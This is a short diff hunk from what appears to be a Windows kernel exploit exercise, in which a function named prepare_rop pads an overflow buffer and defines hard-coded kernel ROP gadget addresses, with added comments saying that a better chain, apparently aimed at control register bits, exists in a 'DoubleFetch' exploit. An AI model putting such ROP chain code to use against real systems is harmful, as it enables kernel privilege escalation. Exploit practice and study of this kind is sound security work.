@@ -12,6 +12,9 @@ void prepare_rop(ByteVector& in_buffer, Address64 shellcode_address)
 	std::memset(in_buffer.data(), 0xAA, return_address_offset);
 
 	// ntos base -> 0xFFFFF804B1000000
+	// I have a better ROP chain in the DoubleFetch exploit.
+	// I still wanted to craft the value in a more complex rop chain by myself.
+	// Also, this one can be prone to control register bit pinning and the much better exploit is using a binary `and` like the one in DoubleFetch
 	static constexpr Address64 ZERO_RAX = 0xFFFFF804B168EB5A;
 	static constexpr Address64 MOV_RCX_0xFFFFFFFFF = 0xFFFFF804B12548AC;
 	static constexpr Address64 OR_RAX_RCX = 0xFFFFF804B1246AC6;
